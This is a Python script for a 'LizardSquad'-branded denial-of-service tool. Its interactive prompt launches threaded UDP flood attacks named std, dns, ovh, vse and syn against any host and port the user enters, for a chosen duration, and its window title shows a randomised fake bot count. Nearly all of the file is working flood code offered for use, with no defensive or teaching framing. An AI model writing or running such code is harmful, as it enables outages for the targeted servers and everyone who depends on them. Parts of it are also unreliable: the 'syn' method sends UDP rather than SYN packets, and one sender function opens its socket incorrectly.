import os
import sys
import socket
import time
import threading
import random

# Global Variables
fsubs = 0
tpings = 0
pscans = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
running = 0
iaid = 0
haid = 0
aid = 0
attack = True
ldap = True
http = True
atks = 0

# Random sender function for attack
def randsender(host, timer, port, punch):
    global iaid, aid, tattacks, running

    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

    iaid += 1
    aid += 1
    tattacks += 1
    running += 1

    while time.time() < timeout and ldap and attack:
        sock.sendto(punch, (host, int(port)))

    running -= 1
    iaid -= 1
    aid -= 1

# Standard sender function for UDP flood attack
def stdsender(host, port, timer, payload):
    global atks, running

    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    atks += 1
    running += 1

    while time.time() < timeout and attack:
        for _ in range(8):  # Send multiple payloads for intensity
            sock.sendto(payload, (host, int(port)))

    atks -= 1
    running -= 1

# Function to display help information
def help():
    print("""
Available Commands:
--------------------
1. clear / cls / ?          : Clears the screen.
2. layer4                    : Displays the Layer 4 attack methods.
3. std <host> <duration> <port> : Launches a standard UDP flood attack.
   Example: std 192.168.1.1 10 80
4. dns <host> <duration> <port> : Launches a DNS attack.
   Example: dns example.com 10 53
5. ovh <host> <duration> <port>  : Launches an attack targeting OVH servers.
   Example: ovh 192.168.1.1 10 80
6. vse <host> <duration> <port>  : Launches a Source Engine Query attack.
   Example: vse 192.168.1.1 10 27015
7. syn <host> <duration> <port>  : Launches a SYN flood attack.
   Example: syn 192.168.1.1 10 80
8. exit                       : Exits the script.
""")

# Main interaction loop
def main():
    global fsubs, tpings, pscans, liips, tattacks, uaid, running, atks, ldap, said, iaid, haid, aid, attack

    while True:
        bots = random.randint(32500, 41500)
        sys.stdout.write(f"\x1b]2;LizardSquad. | Devices: [{bots}] | Spoofed Servers [19] | Server Units [8] | Clients: [18]\x07")
        
        sin = input(f"\033[32m[\033[35m{nicknm}\033[32m@LizardSquad]\033[36m$ \033[96m").lower()
        sinput = sin.split(" ")[0]
        
        # Clearing screen commands
        if sinput in ["clear", "cls", "?"]:
            os.system("clear")
            print(banner)
            main()
        
        # Help command
        elif sinput == "help":
            help()  # Call the help function

        # Layer 4 attack methods
        elif sinput == "layer4":
            os.system("clear")
            print(layer4)
            main()

        # Attack launch handling
        elif sinput == "std":
            handle_attack(sin, stdsender, b"\x73\x74\x64\x00\x00\x00\x00\x00")
        elif sinput == "dns":
            handle_attack(sin, stdsender, b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00")
        elif sinput == "ovh":
            handle_attack(sin, stdsender, b"\x00\x02\x00\x2f")
        elif sinput == "vse":
            handle_attack(sin, stdsender, b"\xff\xff\xff\xffTSource Engine Query\x00")
        elif sinput == "syn":
            handle_attack(sin, stdsender, b"\x58\x99\x21\x58\x99\x21" * 10)

        # Exit command
        elif sinput == "exit":
            os.system("clear")
            exit()

        else:
            main()

# Function to handle launching attacks with error checking
def handle_attack(sin, attack_func, payload):
    global running

    try:
        if running >= 1:
            print("\033[97mYou have reached your concurrent limit and must wait for your cooldown period to end.")
        else:
            sinput, host, timer, port = sin.split(" ")
            socket.gethostbyname(host)  # Resolve host

            # Start the attack in a new thread
            threading.Thread(target=attack_func, args=(host, port, timer, payload)).start()
            print("\033[97mYour Attack Has Been Launched!")
    except ValueError:
        main()
    except socket.gaierror:
        print("\033[91mInvalid Host!")
        main()

if __name__ == "__main__":
    banner = """
    ==================================
    LizardSquad Attack Script Initialized
    ==================================
    """
    print(banner)
    nicknm = "User"  # Update nickname here
    main()
